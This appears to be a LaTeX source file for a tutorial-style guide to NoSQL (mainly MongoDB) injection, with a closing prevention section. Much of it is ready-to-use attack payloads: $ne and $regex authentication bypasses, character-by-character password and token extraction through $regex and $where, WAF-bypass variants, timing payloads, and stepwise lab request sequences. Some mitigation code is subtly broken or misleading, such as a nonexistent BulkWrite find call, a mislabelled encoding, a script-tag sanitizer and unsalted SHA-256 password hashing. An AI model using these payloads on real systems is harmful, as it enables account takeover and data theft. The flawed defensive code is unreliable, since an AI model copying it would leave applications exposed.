@@ -1,0 +1,853 @@
+\documentclass[12pt]{article}
+
+\usepackage[a4paper,margin=0.5in]{geometry}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{titlesec}
+\usepackage{tcolorbox}
+\usepackage{longtable}
+\usepackage{multicol}
+\usepackage{booktabs}
+\usepackage{listings}
+\usepackage{amssymb}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{infoboxcolor}{rgb}{0.9,0.95,1}
+\definecolor{warningcolor}{rgb}{1,0.95,0.9}
+\definecolor{criticalcolor}{rgb}{1,0.9,0.9}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{blue},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+% Custom boxes
+\newtcolorbox{infobox}[1][]{colback=infoboxcolor,colframe=blue!50!black,title=#1,boxrule=1pt}
+\newtcolorbox{warningbox}[1][]{colback=warningcolor,colframe=orange!50!black,title=#1,boxrule=1pt}
+\newtcolorbox{criticalbox}[1][]{colback=criticalcolor,colframe=red!50!black,title=#1,boxrule=1pt}
+
+\title{NoSQL Injection Complete Guide}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% ==================================================
+\section{What is NoSQL}
+
+\subsection{Definition}
+
+NoSQL (Not Only SQL) databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.
+
+\subsection{Types of NoSQL Databases}
+
+\begin{longtable}{|l|l|l|}
+\hline
+\textbf{Type} & \textbf{Examples} & \textbf{Query Language} \\
+\hline
+Document Store & MongoDB, CouchDB & JSON-based queries \\
+\hline
+Key-Value Store & Redis, DynamoDB & GET/PUT operations \\
+\hline
+Column Family & Cassandra, HBase & CQL \\
+\hline
+Graph Database & Neo4j, ArangoDB & Cypher, Gremlin \\
+\hline
+\end{longtable}
+
+\subsection{How NoSQL Differs from SQL}
+
+\begin{itemize}
+    \item No fixed schema required
+    \item No joins (usually)
+    \item Horizontal scaling
+    \item JSON/BSON data format
+    \item Query operators instead of SQL keywords
+    \item JavaScript execution in queries (MongoDB)
+\end{itemize}
+
+\begin{infobox}[Key Difference]
+Unlike SQL databases that use a universal query language, NoSQL databases use a variety of query languages, making injection attacks different for each database type.
+\end{infobox}
+
+% ==================================================
+\section{What is NoSQL Injection}
+
+\subsection{Definition}
+
+NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. This occurs when user input is not properly sanitized before being used in database queries.
+
+\subsection{Impact}
+
+NoSQL injection may enable an attacker to:
+
+\begin{itemize}
+    \item Bypass authentication or protection mechanisms
+    \item Extract or edit data
+    \item Cause a denial of service
+    \item Execute code on the server (in some cases)
+    \item Access unauthorized information
+\end{itemize}
+
+\subsection{Types of NoSQL Injection}
+
+\begin{enumerate}
+    \item \textbf{Syntax Injection} - Breaking the query syntax to inject malicious payloads
+    \item \textbf{Operator Injection} - Using NoSQL query operators like \$ne, \$gt, \$regex, \$where
+\end{enumerate}
+
+% ==================================================
+\section{Where to Find NoSQL Injection}
+
+\subsection{Common Locations}
+
+\begin{itemize}
+    \item Login forms (authentication bypass)
+    \item Search functionality
+    \item Product filters and categories
+    \item User profile lookups
+    \item API endpoints using JSON
+    \item Applications using MongoDB, CouchDB, or other NoSQL databases
+\end{itemize}
+
+\subsection{How to Identify NoSQL Usage}
+
+Look for these indicators:
+
+\begin{itemize}
+    \item JSON responses with MongoDB-specific fields (\_id, ObjectId)
+    \item URL parameters using bracket notation (user[\$ne]=admin)
+    \item API endpoints accepting JSON in request body
+    \item Responses containing error messages mentioning MongoDB, CouchDB, etc.
+\end{itemize}
+
+% ==================================================
+\section{Vulnerable Code Examples}
+
+\subsection{PHP with MongoDB}
+
+\begin{lstlisting}[language=PHP, caption=Vulnerable PHP/MongoDB Code]
+<?php
+// Vulnerable: Direct concatenation of user input
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$collection = (new MongoDB\Client)->app->users;
+$query = ['username' => $username, 'password' => $password];
+
+// No sanitization - vulnerable to operator injection
+$user = $collection->findOne($query);
+
+if ($user) {
+    $_SESSION['user'] = $user;
+    echo "Login successful";
+} else {
+    echo "Invalid credentials";
+}
+?>
+\end{lstlisting}
+
+\begin{lstlisting}[language=PHP, caption=Vulnerable Search Function]
+<?php
+// Vulnerable search with $where operator
+$category = $_GET['category'];
+$collection = (new MongoDB\Client)->shop->products;
+
+// Direct string concatenation in $where
+$query = ['$where' => "this.category == '$category'"];
+$products = $collection->find($query);
+
+foreach ($products as $product) {
+    echo $product['name'] . "<br>";
+}
+?>
+\end{lstlisting}
+
+\subsection{Laravel (MongoDB with Eloquent)}
+
+\begin{lstlisting}[language=PHP, caption=Vulnerable Laravel/MongoDB Code]
+<?php
+namespace App\Http\Controllers;
+
+use App\Models\User;
+use Illuminate\Http\Request;
+
+class AuthController extends Controller
+{
+    public function login(Request $request)
+    {
+        // Vulnerable: No input sanitization
+        $username = $request->input('username');
+        $password = $request->input('password');
+        
+        // This is vulnerable to operator injection
+        $user = User::where('username', $username)
+                    ->where('password', $password)
+                    ->first();
+        
+        if ($user) { return redirect('/dashboard'); }
+        
+        return back()->with('error', 'Invalid credentials');
+    }
+    
+    public function search(Request $request)
+    {
+        // Vulnerable search with regex
+        $query = $request->input('q');
+        
+        // Direct use of user input
+        $products = Product::where('name', 'like', "%$query%")->get();
+        
+        // In MongoDB driver, this becomes regex injection
+        return view('search', ['products' => $products]);
+    }
+}
+?>
+\end{lstlisting}
+
+\begin{warningbox}[Laravel Specific]
+When using MongoDB with Laravel (jenssegers/laravel-mongodb), the same operator injection vulnerabilities exist as in raw MongoDB.
+\end{warningbox}
+
+% ==================================================
+\section{Detection of NoSQL Injection}
+
+\subsection{Syntax Injection Detection}
+
+Test with fuzz strings that break query syntax:
+
+\begin{lstlisting}
+# MongoDB fuzz strings
+'
+"
+\'
+\"
+`
+`
+{
+;
+$Foo
+\xYZ
+%00
+\end{lstlisting}
+
+\subsection{URL-Encoded Payload Example}
+
+\begin{lstlisting}
+https://insecure.com/products?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+\end{lstlisting}
+
+\subsection{Conditional Behavior Test}
+
+Test with true/false conditions:
+
+\begin{lstlisting}
+# False condition
+/products?category=fizzy'+%26%26+0+%26%26+'x
+
+# True condition
+/products?category=fizzy'+%26%26+1+%26%26+'x
+\end{lstlisting}
+
+If responses differ, the application may be vulnerable.
+
+\subsection{Null Byte Injection}
+
+Test with null character:
+
+\begin{lstlisting}
+/products?category=fizzy'%00
+\end{lstlisting}
+
+MongoDB may ignore characters after null byte, potentially bypassing additional conditions.
+
+\subsection{Operator Injection Detection}
+
+Test with query operators:
+
+\begin{lstlisting}
+# Original request
+{"username":"admin","password":"password"}
+
+# Test with $ne operator
+{"username":{"$ne":"invalid"},"password":"password"}
+{"username":"admin","password":{"$ne":"invalid"}}
+{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
+\end{lstlisting}
+
+% ==================================================
+\section{When to Search for NoSQL Injection}
+
+\subsection{Indicators}
+
+Look for NoSQL injection when:
+
+\begin{itemize}
+    \item Application uses MongoDB, CouchDB, or other NoSQL databases
+    \item API endpoints accept JSON input
+    \item Login forms without SQL error messages
+    \item Search functionality with advanced filters
+    \item User profile lookup by username
+    \item Applications that use JavaScript-based queries
+\end{itemize}
+
+\subsection{Common Parameter Names}
+
+\begin{multicols}{3}
+\begin{itemize}
+    \item username
+    \item user
+    \item email
+    \item password
+    \item pass
+    \item search
+    \item q
+    \item category
+    \item filter
+    \item id
+    \item \_id
+    \item token
+\end{itemize}
+\end{multicols}
+
+% ==================================================
+\section{Operator Injection}
+
+\subsection{Common MongoDB Operators}
+
+\begin{longtable}{|l|l|l|}
+\hline
+\textbf{Operator} & \textbf{Description} & \textbf{Example} \\
+\hline
+\$ne & Not equal & \{"price": \{"\$ne": 0\}\} \\
+\hline
+\$gt & Greater than & \{"age": \{"\$gt": 18\}\} \\
+\hline
+\$lt & Less than & \{"age": \{"\$lt": 65\}\} \\
+\hline
+\$regex & Regular expression & \{"name": \{"\$regex": "\^{}A.*"\}\} \\
+\hline
+\$in & In array & \{"role": \{"\$in": ["admin", "user"]\}\} \\
+\hline
+\$nin & Not in array & \{"status": \{"\$nin": ["banned"]\}\} \\
+\hline
+\$where & JavaScript expression & \{"\$where": "this.age > 18"\} \\
+\hline
+\$exists & Field exists & \{"email": \{"\$exists": true\}\} \\
+\hline
+\$type & Field type & \{"\_id": \{"\$type": "objectId"\}\} \\
+\hline
+\end{longtable}
+
+\subsection{Operator Injection Examples}
+
+\subsubsection{URL Parameter Injection}
+
+\begin{lstlisting}
+# Original
+/user?username=admin
+
+# Operator injection
+/user?username[$ne]=invalid
+/user?username[$gt]=a
+/user?username[$regex]=^admin
+\end{lstlisting}
+
+\subsubsection{JSON Body Injection}
+
+\begin{lstlisting}
+# Original
+{"username": "admin", "password": "pass"}
+
+# Operator injection
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": "wrong"}}
+\end{lstlisting}
+
+% ==================================================
+\section{Authentication Bypass}
+
+\subsection{Basic Bypass Techniques}
+
+\subsubsection{URL-Encoded POST Data}
+
+\begin{lstlisting}
+# Bypass with $ne
+username[$ne]=toto&password[$ne]=toto
+
+# Bypass with regex
+username[$regex]=a.*&password[$ne]=lol
+
+# Bypass with range
+username[$gt]=admin&username[$lt]=test&password[$ne]=1
+
+# Bypass with $nin
+username[$nin][]=admin&username[$nin][]=test&password[$ne]=toto
+\end{lstlisting}
+
+\subsubsection{JSON Data}
+
+\begin{lstlisting}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
+\end{lstlisting}
+
+\newpage
+\subsection{Authentication Bypass Example}
+
+\begin{lstlisting}
+POST /login HTTP/1.1
+Content-Type: application/json
+
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+\end{lstlisting}
+
+This query returns all users where both username and password are not equal to "invalid", logging you in as the first user in the collection.
+
+% ==================================================
+\section{Extract Length Information}
+
+\subsection{Using \$regex for Length Detection}
+
+\subsubsection{URL Parameter}
+
+\begin{lstlisting}
+# Test if password length is 1
+user=admin&password[$regex]=.{1}
+
+# Test if password length is 3
+user=admin&password[$regex]=.{3}
+\end{lstlisting}
+
+\subsubsection{JSON Body}
+
+\begin{lstlisting}
+{"username": "admin", "password": {"$regex": "^.{8}$"}}
+{"username": "admin", "password": {"$regex": "^.{0,20}$"}}
+\end{lstlisting}
+
+
+% ==================================================
+\section{Extract Data Information}
+
+\subsection{Using \$regex for Character Extraction}
+
+\subsubsection{URL Parameter}
+
+\begin{lstlisting}
+# Extract password character by character
+user=admin&password[$regex]=^m
+user=admin&password[$regex]=^md
+user=admin&password[$regex]=^mdp
+user=admin&password[$regex]=^mdp.
+user=admin&password[$regex]=^mdp.s
+\end{lstlisting}
+
+\subsubsection{JSON Body}
+
+\begin{lstlisting}
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ad"}}
+{"username": "admin", "password": {"$regex": "^adm"}}
+{"username": "admin", "password": {"$regex": "^admi"}}
+\end{lstlisting}
+
+\subsection{Using \$in for Enumeration}
+
+\begin{lstlisting}
+{"username": {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]}, "password": {"$gt": ""}}
+\end{lstlisting}
+
+\subsection{Using \$where for JavaScript Injection}
+
+\begin{lstlisting}
+# Extract first character of password
+{"$where": "this.username == 'admin' && this.password[0] == 'a'"}
+
+# Extract password using match()
+{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
+\end{lstlisting}
+
+
+\subsection{Extracting Field Names}
+
+\begin{lstlisting}
+# Extract first field name character by character
+{"$where": "Object.keys(this)[0].match('^.{0}a.*')"}
+
+# Extract specific field index
+{"$where": "Object.keys(this)[1].match('^password.*')"}
+\end{lstlisting}
+
+% ==================================================
+\section{WAF and Bypassing Filters}
+
+\subsection{Duplicate Key Precedence}
+
+In MongoDB, if a document contains duplicate keys, only the last occurrence takes precedence.
+
+\begin{lstlisting}
+# Bypass WAF by adding duplicate keys
+{"id":"10", "id":{"$ne":null}}
+{"username":"guest", "username":{"$ne":"invalid"}, "password":"pass"}
+\end{lstlisting}
+
+\subsection{Alternative Encodings}
+
+\begin{lstlisting}
+# Unicode encoding
+%uff0e%uff0e%uff0f
+%c0%ae%c0%ae%c0%af
+
+# URL encoding variations
+%245b%5d   # $ne encoded
+%24ne      # Partial encoding
+\end{lstlisting}
+
+\subsection{Case Manipulation}
+
+\begin{lstlisting}
+# Some parsers are case-insensitive
+{"username": {"$NE": "invalid"}}
+{"username": {"$nE": "invalid"}}
+{"username": {"$Ne": "invalid"}}
+\end{lstlisting}
+
+\subsection{Whitespace Bypass}
+
+\begin{lstlisting}
+# Add whitespace characters
+{"username":{"$ne": "invalid"},"password":"pass"}
+{"username" : {"$ne" : "invalid"}, "password" : "pass"}
+{"username":\t{"$ne":\n"invalid"}}
+\end{lstlisting}
+
+\subsection{JSON Variations}
+
+\begin{lstlisting}
+# Single quotes instead of double quotes
+{'username': {'$ne': 'invalid'}}
+
+# No quotes around keys
+{username: {$ne: "invalid"}}
+
+# Mixed quoting
+{"username": {'$ne': "invalid"}}
+\end{lstlisting}
+
+\subsection{Timing-Based Blind NoSQL}
+
+\begin{lstlisting}
+# Timing attack with sleep
+{"$where": "sleep(5000)"}
+{"$where": "function() { var waitTill = new Date(new Date().getTime() + 5000); while (waitTill > new Date()) {}; return true; }"}
+
+# Conditional timing
+{"$where": "if(this.password[0] == 'a') { sleep(5000) }"}
+admin' && function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+\end{lstlisting}
+
+% ==================================================
+\section{Examples}
+
+\subsection{Lab Example 1: Extract Administrator Password}
+
+\begin{lstlisting}
+# Step 1: Test for injection
+GET /user/lookup?user=wiener' HTTP/1.1
+
+# Step 2: Test boolean conditions
+GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'2 HTTP/1.1
+GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'1 HTTP/1.1
+
+# Step 3: Find password length
+GET /user/lookup?user=administrator'+%26%26+this.password.length+%3c+30+||+'a'%3d%3d'b HTTP/1.1
+
+# Step 4: Extract password characters
+GET /user/lookup?user=administrator'+%26%26+this.password[0]%3d%3d'a'+||+'a'%3d%3d'b HTTP/1.1
+\end{lstlisting}
+
+\subsection{Lab Example 2: Extract Unknown Fields}
+
+\begin{lstlisting}
+# Step 1: Test operator injection
+POST /login HTTP/1.1
+{"username":"carlos","password":{"$ne":"invalid"}}
+
+# Step 2: Test $where injection
+POST /login HTTP/1.1
+{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
+
+# Step 3: Extract field names
+POST /login HTTP/1.1
+{"username":"carlos","password":{"$ne":"invalid"}, "$where": "Object.keys(this)[1].match('^.{0}a.*')"}
+
+# Step 4: Extract token value
+POST /login HTTP/1.1
+{"username":"carlos","password":{"$ne":"invalid"}, "$where": "this.YOURTOKEN.match('^.{0}a.*')"}
+\end{lstlisting}
+
+% ==================================================
+\section{Methodology}
+
+\subsection{Testing Workflow}
+
+\begin{enumerate}
+    \item \textbf{Identify NoSQL usage}
+    \begin{itemize}
+        \item Check for MongoDB error messages
+        \item Look for JSON-based APIs
+        \item Identify bracket notation in parameters
+    \end{itemize}
+    
+    \item \textbf{Test for syntax injection}
+    \begin{itemize}
+        \item Submit fuzz strings
+        \item Look for error messages
+        \item Test boolean conditions
+    \end{itemize}
+    
+    \item \textbf{Test for operator injection}
+    \begin{itemize}
+        \item Try \$ne, \$gt, \$lt operators
+        \item Test authentication bypass
+        \item Attempt to extract data
+    \end{itemize}
+    
+    \item \textbf{Exploit if vulnerable}
+    \begin{itemize}
+        \item Extract length information
+        \item Extract data using regex
+        \item Use blind techniques if needed
+    \end{itemize}
+    
+    \item \textbf{Report findings}
+    \begin{itemize}
+        \item Document vulnerable parameters
+        \item Provide proof of concept
+        \item Suggest remediation
+    \end{itemize}
+\end{enumerate}
+
+\subsection{Testing Checklist}
+
+\begin{longtable}{|p{5cm}|p{5cm}|}
+\hline
+\textbf{Test} & \textbf{Status} \\
+\hline
+Identify NoSQL database type & $\square$ \\
+\hline
+Test syntax injection with fuzz strings & $\square$ \\
+\hline
+Test boolean conditions & $\square$ \\
+\hline
+Test \$ne operator for auth bypass & $\square$ \\
+\hline
+Test \$regex for data extraction & $\square$ \\
+\hline
+Test \$where for JavaScript injection & $\square$ \\
+\hline
+Test null byte injection & $\square$ \\
+\hline
+Extract password length & $\square$ \\
+\hline
+Extract password characters & $\square$ \\
+\hline
+Extract field names & $\square$ \\
+\hline
+Test timing-based injection & $\square$ \\
+\hline
+\end{longtable}
+
+% ==================================================
+\section{Prevention and Mitigation}
+
+\subsection{Input Validation}
+
+\subsubsection{Whitelist Approach}
+
+\begin{lstlisting}[language=PHP]
+<?php
+// Whitelist allowed values
+$allowed_users = ['admin', 'user', 'guest'];
+$username = $_POST['username'];
+
+if (!in_array($username, $allowed_users)) {
+    die('Invalid input');
+}
+
+// Safe query
+$collection->findOne(['username' => $username]);
+?>
+\end{lstlisting}
+
+\subsubsection{Type Casting}
+
+\begin{lstlisting}[language=PHP]
+<?php
+// Force integer type
+$id = (int)$_GET['id'];
+$collection->findOne(['_id' => $id]);
+
+// Force string type
+$username = (string)$_POST['username'];
+$collection->findOne(['username' => $username]);
+?>
+\end{lstlisting}
+
+\subsection{Parameterized Queries}
+
+\begin{lstlisting}[language=PHP]
+<?php
+// Use MongoDB\Driver\Manager with options
+$manager = new MongoDB\Driver\Manager("mongodb://localhost:27017");
+
+$bulk = new MongoDB\Driver\BulkWrite;
+$bulk->find(['username' => ['$eq' => $username]]);
+
+// Use query builders that escape input
+use Jenssegers\Mongodb\Eloquent\Model;
+
+class User extends Model {
+    protected $connection = 'mongodb';
+}
+
+// Laravel's query builder escapes input
+$user = User::where('username', $username)->first();
+?>
+\end{lstlisting}
+
+\subsection{Disable Dangerous Features}
+
+\subsubsection{MongoDB Configuration}
+
+\begin{lstlisting}
+// Disable $where operator (requires restart)
+mongod --noscripting
+
+// In mongod.conf
+security:
+    javascriptEnabled: false
+\end{lstlisting}
+
+\subsection{Input Sanitization}
+
+\begin{lstlisting}[language=PHP]
+<?php
+function sanitize_nosql($input) {
+    // Remove query operators
+    $input = preg_replace('/\$[a-zA-Z]+/', '', $input);
+    
+    // Remove JavaScript
+    $input = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $input);
+    
+    // Escape special characters
+    $input = addslashes($input);
+    
+    return $input;
+}
+
+$username = sanitize_nosql($_POST['username']);
+?>
+\end{lstlisting}
+
+\subsection{Laravel Specific Prevention}
+
+\begin{lstlisting}[language=PHP]
+<?php
+
+// Use validation rules
+$request->validate([
+    'username' => 'required|string|alpha_num|max:255',
+    'email' => 'required|email',
+    'id' => 'required|integer'
+]);
+
+
+// Use Eloquent properly
+$user = User::where('username', $request->username)
+            ->where('password', hash('sha256', $request->password))
+            ->first();
+
+// Avoid using raw expressions
+// BAD: User::whereRaw("username = '$username'")
+// GOOD: User::where('username', $username)
+?>
+\end{lstlisting}
+
+\subsection{Mitigation Checklist}
+
+\begin{longtable}{|p{5cm}|p{5cm}|}
+\hline
+\textbf{Control} & \textbf{Status} \\
+\hline
+Input validation with whitelist & $\square$ \\
+\hline
+Type casting for numeric inputs & $\square$ \\
+\hline
+Parameterized queries & $\square$ \\
+\hline
+Disable \$where operator & $\square$ \\
+\hline
+Input sanitization & $\square$ \\
+\hline
+ObjectID validation & $\square$ \\
+\hline
+Query result limits & $\square$ \\
+\hline
+Security logging & $\square$ \\
+\hline
+Regular security testing & $\square$ \\
+\hline
+Use of ORM/ODM properly & $\square$ \\
+\hline
+\end{longtable}
+
+\begin{criticalbox}[Key Takeaway]
+The most effective prevention for NoSQL injection is to:
+\begin{enumerate}
+    \item Never trust user input
+    \item Use whitelists for allowed values
+    \item Type cast inputs to expected types
+    \item Disable dangerous JavaScript execution
+    \item Use parameterized queries when available
+\end{enumerate}
+\end{criticalbox}
+
+\begin{infobox}[Tools Reference]
+Useful tools for NoSQL injection testing:
+\begin{itemize}
+    \item \textbf{NoSQLmap} - Automated NoSQL exploitation
+    \item \textbf{Burp NoSQLi Scanner} - Burp extension
+\end{itemize}
+\end{infobox}
+
+\end{document}
